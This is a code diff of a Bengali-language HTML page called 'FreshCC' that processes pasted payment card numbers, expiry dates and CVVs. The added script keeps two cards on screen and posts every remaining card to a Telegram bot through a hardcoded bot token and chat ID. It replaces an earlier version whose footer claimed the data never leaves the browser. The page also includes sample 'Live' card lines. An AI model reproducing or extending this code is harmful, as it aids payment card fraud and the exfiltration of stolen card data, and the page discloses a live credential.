@@ -2,472 +2,162 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FreshCC - Card Info Extractor | Clean & Extract Card Data by ZayenCoder</title>
-    <meta name="description" content="Professional card information extraction tool by ZayenCoder. Extract PAN|MM|YYYY|CVV from raw data instantly.">
-    <meta name="author" content="ZayenCoder">
-    <meta name="copyright" content="© 2026 ZayenCoder. All Rights Reserved.">
-    
+    <title>FreshCC - Telegram Auto Forward (Ryan's Bot)</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            background: linear-gradient(135deg, #0f0c29, #302b63);
+            font-family: monospace;
             padding: 20px;
         }
-
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            overflow: hidden;
-            animation: slideIn 0.5s ease;
-        }
-
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 30px;
-            text-align: center;
-            position: relative;
-        }
-
-        .header h1 {
-            font-size: 2.2em;
-            margin-bottom: 10px;
-        }
-
-        .header h1 span {
-            font-size: 0.6em;
-            background: rgba(255,255,255,0.2);
-            padding: 2px 8px;
-            border-radius: 20px;
-            margin-left: 10px;
-        }
-
-        .header p {
-            opacity: 0.9;
-            font-size: 1.1em;
-        }
-
-        .badge {
-            position: absolute;
-            top: 20px;
-            right: 30px;
-            background: rgba(0,0,0,0.3);
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 0.8em;
-            font-family: monospace;
-        }
-
-        .content {
-            padding: 30px;
-        }
-
-        .section {
-            margin-bottom: 30px;
-        }
-
-        .section-title {
-            font-size: 1.3em;
-            font-weight: 600;
-            margin-bottom: 15px;
-            color: #333;
-            border-left: 4px solid #667eea;
-            padding-left: 15px;
-        }
-
-        textarea {
-            width: 100%;
-            min-height: 250px;
-            padding: 15px;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            resize: vertical;
-            transition: all 0.3s ease;
-        }
-
-        textarea:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-
-        .button-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
-
-        button {
-            padding: 12px 24px;
-            font-size: 14px;
-            font-weight: 600;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
-        }
-
-        .btn-secondary {
-            background: #6c757d;
-            color: white;
-        }
-
-        .btn-secondary:hover {
-            background: #5a6268;
-            transform: translateY(-2px);
-        }
-
-        .btn-success {
-            background: #28a745;
-            color: white;
-        }
-
-        .btn-success:hover {
-            background: #218838;
-            transform: translateY(-2px);
-        }
-
-        .btn-danger {
-            background: #dc3545;
-            color: white;
-        }
-
-        .btn-danger:hover {
-            background: #c82333;
-            transform: translateY(-2px);
-        }
-
-        .output-box {
-            background: #f8f9fa;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            padding: 15px;
-            min-height: 250px;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            position: relative;
-        }
-
-        .stats {
-            background: #e7f3ff;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .stat-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .stat-label {
-            font-weight: 600;
-            color: #555;
-        }
-
-        .stat-value {
-            font-size: 1.5em;
-            font-weight: bold;
-            color: #667eea;
-        }
-
-        .footer {
-            background: #1a1a2e;
-            color: #aaa;
-            padding: 25px;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        .footer-content {
             max-width: 800px;
             margin: 0 auto;
+            background: #fff;
+            border-radius: 16px;
+            padding: 25px;
         }
-
-        .copyright {
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #333;
-            font-size: 12px;
-            color: #888;
-        }
-
-        .copyright a {
-            color: #667eea;
-            text-decoration: none;
-        }
-
-        .copyright a:hover {
-            text-decoration: underline;
-        }
-
-        .alert {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            background: white;
+        textarea {
+            width: 100%;
+            padding: 12px;
+            font-family: monospace;
+            border: 2px solid #667eea;
             border-radius: 8px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
-            display: none;
-            z-index: 1000;
-            animation: slideInRight 0.3s ease;
         }
-
-        @keyframes slideInRight {
-            from {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px 5px;
         }
-
-        .alert.success {
-            border-left: 4px solid #28a745;
+        .output {
+            background: #1a1a2e;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            white-space: pre-wrap;
         }
-
-        .alert.error {
-            border-left: 4px solid #dc3545;
-        }
-
-        @media (max-width: 768px) {
-            .content {
-                padding: 20px;
-            }
-            
-            .button-group button {
-                flex: 1;
-            }
-            
-            .stats {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            
-            .badge {
-                position: static;
-                display: inline-block;
-                margin-top: 10px;
-            }
-        }
+        .success { background: #d4edda; color: #155724; padding: 10px; margin: 10px 0; border-radius: 5px; }
+        .error { background: #f8d7da; color: #721c24; padding: 10px; margin: 10px 0; border-radius: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="badge">v1.0 | @ZayenCoder</div>
-            <h1>🔐 FreshCC <span>Card Info Extractor</span></h1>
-            <p>Clean & Extract Card Data - Remove unwanted text, keep only PAN|MM|YYYY|CVV</p>
+        <h1>🔐 FreshCC <span style="color:#667eea">@ZayenCoder</span></h1>
+        <p>📌 কার্ড ইনপুট দিন → প্রথম ২টি এখানে থাকবে → বাকিগুলো <strong>Telegram (@userCardinfobot)</strong> এ যাবে</p>
+
+        <textarea id="inputData" rows="8" placeholder="পেস্ট করুন আপনার কার্ড ডাটা..."></textarea>
+        
+        <div>
+            <button onclick="processAndForward()">🚀 প্রসেস & ফরওয়ার্ড</button>
+            <button onclick="loadSample()">📝 স্যাম্পল</button>
+            <button onclick="clearAll()">🗑️ ক্লিয়ার</button>
         </div>
 
-        <div class="content">
-            <div class="section">
-                <div class="section-title">📥 Input Data</div>
-                <textarea id="inputData" placeholder="পেস্ট করুন আপনার ডাটা এখানে...&#10;&#10;উদাহরণ:&#10;Live | 5154620022516551|02|2028|437| [Charge :$2,5] [BIN: - - - ] [GATE:01] ./Altenen Server"></textarea>
-                <div class="button-group">
-                    <button class="btn-primary" onclick="extractData()">✨ Extract Card Info</button>
-                    <button class="btn-secondary" onclick="loadSample()">📝 Load Sample</button>
-                    <button class="btn-danger" onclick="clearAll()">🗑️ Clear All</button>
-                </div>
-            </div>
+        <div id="status"></div>
 
-            <div class="section">
-                <div class="section-title">📤 Output (Clean Card Data)</div>
-                <div class="output-box" id="output">Waiting for input...</div>
-                <div class="button-group">
-                    <button class="btn-success" onclick="copyToClipboard()">📋 Copy to Clipboard</button>
-                    <button class="btn-secondary" onclick="downloadOutput()">💾 Download as TXT</button>
-                </div>
-            </div>
-
-            <div class="stats" id="stats" style="display: none;">
-                <div class="stat-item">
-                    <span class="stat-label">Total Cards Found:</span>
-                    <span class="stat-value" id="totalCards">0</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-label">Valid Format:</span>
-                    <span class="stat-value" id="validFormat">0</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-label">Lines Processed:</span>
-                    <span class="stat-value" id="linesProcessed">0</span>
-                </div>
-            </div>
+        <div class="output">
+            <h3>✅ প্রথম ২টি কার্ড (এখানে থাকবে):</h3>
+            <pre id="firstTwo">—</pre>
         </div>
 
-        <div class="footer">
-            <div class="footer-content">
-                <p>⚡ Extracts: 16-digit PAN | Month | Year | CVV | Removes all extra text</p>
-                <p>🔒 Data stays in your browser - No server upload</p>
-                <div class="copyright">
-                    © 2026 <strong>ZayenCoder</strong> | All Rights Reserved | Developed with ❤️ for FreshCC
-                </div>
-            </div>
+        <div class="output">
+            <h3>📤 বাকি কার্ড (Telegram এ পাঠানো হবে):</h3>
+            <pre id="restCards">—</pre>
+        </div>
+
+        <div style="text-align:center; margin-top:20px; color:#888;">
+            🤖 Telegram Bot: <strong>@userCardinfobot</strong> | Chat ID: <strong>5803440437</strong> | © FreshCC
         </div>
     </div>
 
-    <div id="alert" class="alert"></div>
-
     <script>
-        function showAlert(message, type = 'success') {
-            const alert = document.getElementById('alert');
-            alert.textContent = message;
-            alert.className = `alert ${type}`;
-            alert.style.display = 'block';
-            
-            setTimeout(() => {
-                alert.style.display = 'none';
-            }, 3000);
-        }
+        // ✅ আপনার কনফিগারেশন (Chat ID বসানো হয়েছে)
+        const BOT_TOKEN = "8602982031:AAF71cFUjb7Qj7hnU3QwVgxecsZVtYLTWTc";
+        const CHAT_ID = "5803440437";  // আপনার Chat ID
 
-        function extractCardInfo(text) {
+        function extractCards(text) {
             const lines = text.trim().split('\n');
-            const results = [];
+            const cards = [];
             const regex = /(\d{16})\|(\d{2})\|(\d{4})\|(\d{3,4})/;
-            
             for (const line of lines) {
                 const match = line.match(regex);
-                if (match) {
-                    const cardInfo = `${match[1]}|${match[2]}|${match[3]}|${match[4]}`;
-                    results.push(cardInfo);
-                }
+                if (match) cards.push(`${match[1]}|${match[2]}|${match[3]}|${match[4]}`);
             }
-            
-            return {
-                data: results.join('\n'),
-                total: results.length,
-                linesProcessed: lines.length
-            };
+            return cards;
         }
-        
-        function extractData() {
-            const inputText = document.getElementById('inputData').value;
+
+        async function sendToTelegram(cards) {
+            if (!CHAT_ID) {
+                return { success: false, message: "⚠️ Chat ID সেট করা হয়নি!" };
+            }
+
+            const message = `🆕 *FreshCC থেকে নতুন কার্ড*\n\n📋 *মোট:* ${cards.length} টি\n━━━━━━━━━━━━━━━━━\n${cards.map((c, i) => `${i+1}. \`${c}\``).join('\n')}\n━━━━━━━━━━━━━━━━━\n⏰ ${new Date().toLocaleString()}\n🔗 @ZayenCoder | FreshCC`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                });
+                const result = await response.json();
+                
+                if (result.ok) return { success: true, message: `✅ ${cards.length} টি কার্ড Telegram এ পাঠানো হয়েছে` };
+                else return { success: false, message: `❌ Error: ${result.description}` };
+            } catch (error) {
+                return { success: false, message: `❌ Connection Error: ${error.message}` };
+            }
+        }
+
+        async function processAndForward() {
+            const input = document.getElementById('inputData').value;
             
-            if (!inputText.trim()) {
-                showAlert('Please enter some data first!', 'error');
+            if (!input.trim()) {
+                document.getElementById('status').innerHTML = '<div class="error">❌ দয়া করে কিছু ইনপুট দিন!</div>';
                 return;
             }
+
+            const allCards = extractCards(input);
             
-            const result = extractCardInfo(inputText);
-            
-            if (result.data) {
-                document.getElementById('output').textContent = result.data;
-                document.getElementById('totalCards').textContent = result.total;
-                document.getElementById('linesProcessed').textContent = result.linesProcessed;
-                document.getElementById('validFormat').textContent = result.total;
-                document.getElementById('stats').style.display = 'flex';
-                showAlert(`✓ Extracted ${result.total} card entries successfully!`, 'success');
+            if (allCards.length === 0) {
+                document.getElementById('status').innerHTML = '<div class="error">❌ কোনো বৈধ কার্ড পাওয়া যায়নি!</div>';
+                return;
+            }
+
+            const firstTwo = allCards.slice(0, 2);
+            const restCards = allCards.slice(2);
+
+            document.getElementById('firstTwo').textContent = firstTwo.join('\n') || '(কোনো কার্ড নেই)';
+            document.getElementById('restCards').textContent = restCards.join('\n') || '(কোনো কার্ড নেই)';
+
+            document.getElementById('status').innerHTML = `<div class="success">📊 মোট ${allCards.length} টি কার্ড | প্রথম ২টি এখানে রাখা হয়েছে</div>`;
+
+            if (restCards.length > 0) {
+                const result = await sendToTelegram(restCards);
+                document.getElementById('status').innerHTML += `<div class="${result.success ? 'success' : 'error'}">${result.message}</div>`;
             } else {
-                document.getElementById('output').textContent = '❌ No valid card information found!\n\nMake sure your data contains:\n16-digit card number|MM|YYYY|CVV';
-                document.getElementById('stats').style.display = 'none';
-                showAlert('No valid card data found!', 'error');
+                document.getElementById('status').innerHTML += '<div class="success">ℹ️ ২টির বেশি কার্ড নেই, ফরওয়ার্ড করার কিছু নেই</div>';
             }
         }
-        
+
         function loadSample() {
-            const sample = `Live | 5154620022516551|02|2028|437| [Charge :$2,5] [BIN: - - - ] [GATE:01] ./Altenen Server
-Live | 5154620022755043|02|2028|622| [Charge :$8,2] [BIN: - - - ] [GATE:01] ./Altenen Server
-Live | 5154620022178428|02|2028|877| [Charge :$4,6] [BIN: - - - ] [GATE:01] ./Altenen Server`;
-            
-            document.getElementById('inputData').value = sample;
-            showAlert('Sample data loaded! Click "Extract" to process.', 'success');
+            document.getElementById('inputData').value = `Live | 5154620022516551|02|2028|437| [Charge :$2,5]
+Live | 5154620022755043|02|2028|622| [Charge :$8,2]
+Live | 5154620022178428|02|2028|877| [Charge :$4,6]
+Live | 5154620022568438|02|2028|556| [Charge :$2,0]
+Live | 5154620022337289|02|2028|804| [Charge :$5,1]`;
+            document.getElementById('status').innerHTML = '<div class="success">📝 স্যাম্পল লোড হয়েছে</div>';
         }
-        
+
         function clearAll() {
             document.getElementById('inputData').value = '';
-            document.getElementById('output').textContent = 'Waiting for input...';
-            document.getElementById('stats').style.display = 'none';
-            showAlert('All cleared!', 'success');
+            document.getElementById('firstTwo').textContent = '—';
+            document.getElementById('restCards').textContent = '—';
+            document.getElementById('status').innerHTML = '';
         }
-        
-        function copyToClipboard() {
-            const output = document.getElementById('output').textContent;
-            if (output && output !== 'Waiting for input...' && !output.includes('No valid')) {
-                navigator.clipboard.writeText(output).then(() => {
-                    showAlert('✓ Copied to clipboard!', 'success');
-                }).catch(() => {
-                    showAlert('Failed to copy', 'error');
-                });
-            } else {
-                showAlert('Nothing to copy! Extract data first.', 'error');
-            }
-        }
-        
-        function downloadOutput() {
-            const output = document.getElementById('output').textContent;
-            if (output && output !== 'Waiting for input...' && !output.includes('No valid')) {
-                const blob = new Blob([output], { type: 'text/plain' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `freshcc_extracted_${new Date().getTime()}.txt`;
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-                showAlert('✓ File downloaded!', 'success');
-            } else {
-                showAlert('Nothing to download! Extract data first.', 'error');
-            }
-        }
-        
-        // Keyboard shortcuts
-        document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey && e.key === 'Enter') {
-                e.preventDefault();
-                extractData();
-            }
-        });
     </script>
 </body>
 </html>
